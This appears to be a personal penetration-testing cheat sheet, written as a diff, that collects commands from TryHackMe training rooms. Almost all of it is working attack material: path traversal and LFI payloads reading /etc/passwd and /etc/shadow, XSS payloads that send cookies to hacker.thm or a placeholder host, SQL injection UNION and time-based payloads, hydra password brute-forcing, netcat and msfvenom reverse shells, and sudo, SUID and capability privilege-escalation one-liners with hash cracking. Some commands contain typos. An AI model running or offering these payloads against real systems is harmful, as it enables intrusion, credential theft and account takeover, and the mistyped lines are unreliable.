+Path Traversal: http://webapp.thm/get.php?file=../../../../etc/passwd
+http://webapp.thm/get.php?file=../../../../boot.ini
+http://webapp.thm/get.php?file=../../../../windows/win.ini
+/etc/issue, /etc/profile, /proc/version, /etc/passwd, /etc/shadow, /root/.bash_history, /var/log/dmessage, /var/mail/root, /root/.ssh/id_rsa, /var/log/apache2/access.log, C:\boot.ini
+
+LFI:
+http://webapp.thm/index.php?lang=EN
+http://webapp.thm/index.php?lang=../../../../etc/passwd
+
+include("languages/../../../../../etc/passwd%00").".php");
+include("languages/../../../../../etc/passwd");
+
+http://webapp.thm/index.php?lang=/etc/passwd/
+http://webapp.thm/index.php?lang=../../../../etc/passwd
+....//....//....//....//....//etc/passwd
+http://webapp.thm/index.php?lang=languages/EN.php
+lang=languages/../../../../../etc/passwd
+
+
+http://<machine-ip>/challenges/index.php
+
+<script>alert('XSS');</script>
+<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
+<script>user.changeEmail('attacker@hacker.thm');</script>
+<script>alert('THM');</script>
+"><script>alert('THM');</script></textarea><script>alert('THM');</script>
+</textarea><script>alert('THM');</script>
+';alert('THM');//
+<script>alert('THM');</script>
+<sscriptcript>alert('THM');</sscriptcript>
+"><script>alert('THM');</script>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
+</textarea><script>alert('THM');</script>
+</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>
+
+https://github.com/mandatoryprogrammer/xsshunter-express
+
+
+select * from users LIMIT 1;
+select * from users where username='admin';
+select * from users where username != 'admin';
+select * from users where username='admin' or username='jon';
+select * from users where username='admin' and password='p4ssword';
+select * from users where username like 'a%';
+select * from users where username like '%n';
+select * from users where username like '%mi%';
+SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;
+insert into users (username,password) values ('bob','password123');
+update users SET username='root',password='pass123' where username='admin';
+delete from users where username='martin';
+delete from users;
+
+
+https://website.thm/blog?id=1
+SELECT * from blog where id=1 and private=0 LIMIT 1;
+https://website.thm/blog?id=2;--
+SELECT * from blog where id=2;-- and private=0 LIMIT 1;
+SELECT * from blog where id=2;--
+
+
+1 UNION SELECT 1
+1 UNION SELECT 1,2
+1 UNION SELECT 1,2,3
+0 UNION SELECT 1,2,3
+0 UNION SELECT 1,2,database()
+0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
+0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
+0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
+
+
+select * from users where username='%username%' and password='%password%' LIMIT 1;
+' OR 1=1;--
+select * from users where username='' and password='' OR 1=1;
+
+
+select * from users where username = '%username%' LIMIT 1;
+admin123' UNION SELECT 1;-- 
+admin123' UNION SELECT 1,2,3;-- 
+admin123' UNION SELECT 1,2,3 where database() like '%';--
+admin123' UNION SELECT 1,2,3 where database() like 's%';--
+admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
+admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--
+admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
+admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
+admin123' UNION SELECT 1,2,3 from users where username like 'a%
+admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
+
+admin123' UNION SELECT SLEEP(5);--
+admin123' UNION SELECT SLEEP(5),2;--
+referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--
+
+
+Protocol and Servers:
+
+telnet <ip>
+telnet <ip> 80
+telnet <ip> 21
+ftp <ip>
+telnet <ip> 25
+telnet <ip> 110
+telnet <ip> 143
+sudo tcpdump port 110 -A
+
+Protocol > pro, Default Port > port, Secured Protocol > Sec Pr, Default Port with TLS > Def po
+
+Pro     port    Sec Pr  Def po
+HTTP 	80 	HTTPS 	443
+FTP 	21 	FTPS 	990
+SMTP 	25 	SMTPS 	465
+POP3 	110 	POP3S 	995
+IMAP 	143 	IMAPS 	993
+
+
+telnet <ip> 110
+/usr/share/wordlists/rockyou.txt
+hydra -l mark -P /usr/share/wordlists/rockyou.txt MACHINE_IP ftp
+hydra -l mark -P /usr/share/wordlists/rockyou.txt ftp://MACHINE_IP
+hydra -l frank -P /usr/share/wordlists/rockyou.txt MACHINE_IP ssh 
+hydra -l username -P wordlist.txt
+
+
+Net Sec Challenge:
+
+nmap -sC -sV -p- <ip>
+nmap -sC -sV -p- -T4 --min-rate=9326 -vv <ip>
+nmap -p- -T4 <ip>
+nmap -v -T4 — top-ports 10000 <ip>
+telnet <ip> 80
+telnet <ip> 22
+telnet <ip> 10021
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://<ip>:10021
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -vV ftp://<ip>:10021
+sudo nmap -sN <ip>
+sudo nmap -sS <ip>
+
+-- Shell -- 
+
+sudo nc -lvnp 443
+nc <ip> <port> -e /bin/bash
+nc -lvnp <port> -e "cmd.exe"
+nc <ip> <port>
+sudo rlwrap nc -lvnp 443
+sudo nc -lvnp 443
+python -c 'import pty;pty.spawn("/bin/bash")'
+msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
+msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell.elf LHOST=10.10.10.5 LPORT=443
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+--> Linux Privilege Escalation
+
+hostname > print the network node hostname
+uname -n > print the network node hostname
+bash -i > print the network node hostname
+uname -r > print the kernel release
+lsb_release -d > show description of this distribution
+lsb_release -a > show all of the above information
+cat /etc/issue > show all of the above information
+python --version
+searchsploit <version or name of service>
+searchsploit 3.13.0
+searchsploit <Kernerl version of the target>
+searchsploit -m <payload name> > irror (aka copies) an exploit to the current working director
+searchsploit -m name.ext
+pyhton3 -m http.server <port> > when you don't know ports server start default port 8000
+ifconfig tun0 > this command show your VPN ip address
+wget http://10.8.95.15:8080/37292.c
+gcc -static 37292 -o exploit
+./exploit > to run program
+ls -l
+sudo -l
+sudo less /etc/shadow
+sudo find . exec /bin/sh \; -quit
+find / -name flag2.txt 2>/dev/null
+Sudo less /etc/shadow
+cat /etc/passwd
+find / -type f -perm -04000 -ls 2>/dev/null
+/usr/bin/base64 /etc/shadow | /usr/bin/base64 -d
+unshadow passwd shadow | tee cracked
+john --wordlist=/usr/share/wordlists/rockyou.txt cracked
+su user2 > use password previously cracked
+find / -name flag3.txt 2>/dev/null > to find flag3.txt location
+/usr/bin/base64 /home/ubuntu/flag3.txt | /usr/bin/base64 -d
+getcap -r / 2>/dev/null
+./vim -c ':python import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+./view -c ':python import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+getcap -r / 2>/dev/null
+find / -name flag4.txt 2>/dev/null
+cat /etc/cronjob
+grep matt /etc/shadow
+grep matt /etc/passwd
+unshadow passwd shadow | tee Password
+john --wordlist=/usr/share/wordlists/rockyou.txt
+find / -writable 2>/dev/null
+find / -name flag6.txt 2>/dev/null
+showmount -e <Target Machine IP address>
+cat /etc/exports
+/usr/bin/base64 /etc/shadow | /usr/bin/bsae64 -d
+unshadow passdw shadow | tee hash
+sudo find . -exec /bin/sh \; -quit
+find / -name flag2.txt 2>/dev/null
+
+
+echo "bin/bash" > thm
+chmod 777 thm
+export $PATH=/tmp:$PATH
+
+find / -name flag7.txt 2>/dev/null
+./home/matt/flag7.txt
+cat ./home/matt/flag7.txt
+
+find / -name flag1.txt 2>/dev/null
+base64 /home/missy/Documents/flag1.txt | base64 -d
+
+https://medium.com/@yusif_yagubzadeh/tryhackme-linux-privilege-escalation-10a47d3071b6
+https://gtfobins.github.io/
+
+LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
+LinEnum: https://github.com/rebootuser/LinEnum
+LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
+Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
+Linux Priv Checker: https://github.com/linted/linuxprivchecker 
+
+
+Pickle Rick : https://tryhackme.com/r/room/picklerick
+
+nmap <ip>
+nmap <ip> -sC -sV
+nmap -sS -Pn -T4 -p- <ip>
+nmap -A -Pn -T4 -p22,80 <ip>
+nikto <ip>
+gobuster dir -u <ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+dirb <ip>
+masscan -p1-65535 <ip> --rate=1000 -e tun0
+ffuf -u <ip>/FUZZ -w /usr/share/wordlist/dirb/common.txt
+cat name.txt if cat is disabled try less name.txt
+python3 –c ‘import pty;pty.spawn(“/bin/bash”)’
+
+Bounty Hacker : https://tryhackme.com/r/room/cowboyhacker
+
+nmap --top-ports 100 <ip>
+nmap --min-rate 1000 <ip>
+nmap -p21,22,80 -A <ip>
+ftp <ip>
+nmap -A -p 21,22,80 <ip>
+nmap -sC -sV -oN nmap/bountyhacker <ip>
+gobuster dir -u http://<ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -o gobuster.txt -x html,css,py,txt,,phtml,js,json
+hydra -l lin -P locks.txt -t 6 ssh://<ip>
+hydra -l lin -P locks.txt <ip> ssh 
+ssh lin@ip
+pwd 
+ls -la 
+ls -l ~/.ssh 
+cat ~/.ssh/id_rsa 
+ls -la /etc/cron.daily/
+sudo -l
+sudo tar -cf /dev/null /dev/null — checkpoint=1 — checkpoint-action=exec=/bin/sh
+
+https://systemweakness.com/bounty-hacker-tryhackme-writeup-2ccebc54d047
+https://medium.com/@JAlblas/tryhackme-ctf-bounty-hacker-walkthrough-6ec95a1c0389
+https://infosecwriteups.com/tryhackme-bounty-hacker-ctf-writeup-detailed-b1afdc0ed20c
+
+
+LazyAdmin : https://tryhackme.com/r/room/lazyadmin
+
+rustscan -a <ip> -b 1000 -r 0–65535 -t 5000 — -A
+nmap -A <ip>
+gobuster --url <ip> --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+gobuster dir -u <ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+gobuster dir -u <ip> -w <wordlist>
+gobuster dir -u <ip>/content/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+john hash.txt --wordlist=rockyou.txt --format=Raw-MD5
+sudo nx -lvp 443
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+whoami
+ls
+cd home
+ls
+sudo -l
+
+https://medium.com/techiepedia/tryhackme-lazy-admin-walkthrough-afe42873e233
+https://samanthactf.medium.com/tryhackme-lazy-admin-f4c4d38f88b3
+https://infosecwriteups.com/lazy-admin-walkthrough-tryhackme-158540d2ec24
+
+The Cod Caper : https://tryhackme.com/r/room/thecodcaper
+
+nmap -p 1-1000 -sC -A <ip>
+nmap -sS -sV -A <ip>
+curl -s <ip> | grep title
+gobuster dir --url <ip> --wordlist /usr/share/wordlists/dirb/big.txt -x "php,txt,html"
+gobuster dir -u <ip> -x php,txt,html -w /data/src/wordlists/big.txt
+gobuster dir -u <ip> --wordlist /usr/share/wordlists/dirb/common.txt -x html,php,txt
+curl -s http://10.10.166.91/administrator.php
+sqlmap -u http://10.10.166.91/administrator.php --forms --dump
+curl -s --data-urlencode "cmd=ls -l" -X POST http://10.10.166.91/2591c98b70119fe624898b1e424b5e91.php | grep -v -e "^$" | grep -v "<"
+rlwrap nc -nlvp 1234
+curl -s --data-urlencode "cmd=cat /etc/passwd" -X POST http://10.10.166.91/2591c98b70119fe624898b1e424b5e91.php | grep -v -e "^$" | grep -v "<"
+find / -user "www-data" -name "*" 2>/dev/null
+sqlmap -r request.txt -D users --tables
+find / -user pingu -print 2>/dev/null
+find / -name pass* 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+hashcat -m 1800 -a 0 shadow.hash /data/src/wordlists/rockyou.txt
+john shadow.txt --wordlist=/data/src/wordlists/rockyou.txt
+
+https://synackodes.medium.com/the-cod-caper-tryhackme-a-write-up-5a401609d7e2
+https://www.aldeid.com/wiki/TryHackMe-The-Cod-Caper
+https://infosecwriteups.com/the-cod-caper-tryhackme-walkthrough-e4e92e760e0c
+https://github.com/FeeeDz/TryHackMe-The_Cod_Caper-WriteUp/blob/main/README.md
+https://gotoback.medium.com/tryhackme-the-cod-caper-3944d4c8b482
+
+
+Agent Sudo : https://tryhackme.com/r/room/agentsudoctf
+
+nmap -sS -sV -A -O -Pn <ip>
+nmap -sS <ip>
+nmap -Pn <ip>
+hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://<ip> -V -I
+hydra -l chris -P /usr/share/wordlists/rockyou.txt <ip> ftp
+ftp <ip>
+ssh user@ip
+
+https://freedium.cfd/https://medium.com/@JAlblas/tryhackme-agent-sudo-walkthrough-933b977fffb
+https://infosecwriteups.com/agent-sudo-tryhackme-walkthrough-51f498173149
+https://vivekanandagn.medium.com/agent-sudo-walkthrough-tryhackme-571f97c355e5
+
+
+Lian_Yu : https://tryhackme.com/r/room/lianyu
+
+nmap -sC -sV -vv <ip>
+nmap -s -sV <ip>
+nmap --min-rate 1000 <ip>
+nmap -sCV -A <ip>
+gobuster dir -u <ip> -w /root/Desktop/Tools/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+gobuster dir -w /root/Desktop/Tools/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u <ip> -t 40 -x php,html,txt
+gobuster dir -u http://10.10.228.22/ -w/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+gobuster dir -u http://10.10.228.22/island -w/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+gobuster dir --url 10.10.228.22/island/2100 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .ticket 
+curl -s http://10.10.222.216/island/
+wfuzz -w /data/src/wordlists/directory-list-2.3-medium.txt --hc 404 http://10.10.97.18/island/2100/FUZZ.ticket
+curl -s http://10.10.97.18/island/2100/green_arrow.ticket
+ftp <ip>
+ssh user@ip
+sudo -l
+sudo user /bin/sh
+
+https://github.com/riyyoo/TryHackMe-Lian_Yu-Walkthrough
+https://www.aldeid.com/wiki/TryHackMe-Lian-Yu
+https://medium.com/@chandrakanthr899/lian-yu-tryhackme-writeup-66c0ea147139
+https://systemweakness.com/thm-lian-yu-step-by-step-walkthrough-5bb663f4679c
+https://medium.com/@wilklins/lian-yu-tryhackme-writeup-eaf79ec0d1a6
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
